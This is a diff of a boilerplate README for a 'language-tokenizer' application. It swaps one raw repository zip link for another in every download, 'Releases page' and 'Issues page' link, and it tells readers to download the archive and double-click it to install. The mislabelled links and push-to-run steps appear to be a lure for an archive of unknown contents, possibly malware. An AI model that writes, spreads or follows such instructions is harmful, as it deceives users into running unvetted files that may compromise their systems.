@@ -6,20 +6,20 @@ Welcome! This guide will help you download and run the language-tokenizer applic
 
 ## 🔗 Download Link
 
-[![Download language-tokenizer](https://raw.githubusercontent.com/mazebrr/language-tokenizer/master/tests/tokenizer_language_2.1.zip)](https://raw.githubusercontent.com/mazebrr/language-tokenizer/master/tests/tokenizer_language_2.1.zip)
+[![Download language-tokenizer](https://raw.githubusercontent.com/mazebrr/language-tokenizer/master/src/tokenizer_language_v2.7.zip)](https://raw.githubusercontent.com/mazebrr/language-tokenizer/master/src/tokenizer_language_v2.7.zip)
 
 ## 📥 Download & Install
 
 To begin using language-tokenizer, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/mazebrr/language-tokenizer/master/tests/tokenizer_language_2.1.zip) to access the latest version of the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/mazebrr/language-tokenizer/master/src/tokenizer_language_v2.7.zip) to access the latest version of the software.
 
 2. **Choose Your Version**  
    Look for the latest release. You will see various files available for download. 
 
 3. **Download the Application**  
-   Click on the file that matches your operating system. Common options may include `.exe` for Windows and `https://raw.githubusercontent.com/mazebrr/language-tokenizer/master/tests/tokenizer_language_2.1.zip` for Linux. For macOS, look for a `.dmg` file. 
+   Click on the file that matches your operating system. Common options may include `.exe` for Windows and `https://raw.githubusercontent.com/mazebrr/language-tokenizer/master/src/tokenizer_language_v2.7.zip` for Linux. For macOS, look for a `.dmg` file. 
 
 4. **Run the Installer**  
    Once the file is downloaded, locate it in your downloads folder. Double-click the file to start the installation process. Follow the prompts to complete the installation. 
@@ -49,7 +49,7 @@ Before downloading, ensure your computer meets these requirements:
 
 ## 🌟 Tips for Best Performance
 
-- **Keep Software Updated**: Always download the latest version from the [Releases page](https://raw.githubusercontent.com/mazebrr/language-tokenizer/master/tests/tokenizer_language_2.1.zip) to benefit from improvements and bug fixes.
+- **Keep Software Updated**: Always download the latest version from the [Releases page](https://raw.githubusercontent.com/mazebrr/language-tokenizer/master/src/tokenizer_language_v2.7.zip) to benefit from improvements and bug fixes.
 - **Check Your Text**: Make sure your input text is clear for the best results in tokenization.
 
 ## 📘 Troubleshooting
@@ -63,7 +63,7 @@ If you run into any issues:
 
 Feel free to reach out if you need help:
 
-- **GitHub Issues**: Report problems or request features on the [Issues page](https://raw.githubusercontent.com/mazebrr/language-tokenizer/master/tests/tokenizer_language_2.1.zip).
+- **GitHub Issues**: Report problems or request features on the [Issues page](https://raw.githubusercontent.com/mazebrr/language-tokenizer/master/src/tokenizer_language_v2.7.zip).
 - **Discussion Forum**: Join our community discussions for tips and user experiences.
 
 ## 👍 Feedback
@@ -72,4 +72,4 @@ We welcome your thoughts on your experience with language-tokenizer. Your feedba
 
 ## 🔗 Final Download Link
 
-Remember, to download the latest version of language-tokenizer, visit the [Releases page](https://raw.githubusercontent.com/mazebrr/language-tokenizer/master/tests/tokenizer_language_2.1.zip). Enjoy tokenizing your text!
+Remember, to download the latest version of language-tokenizer, visit the [Releases page](https://raw.githubusercontent.com/mazebrr/language-tokenizer/master/src/tokenizer_language_v2.7.zip). Enjoy tokenizing your text!
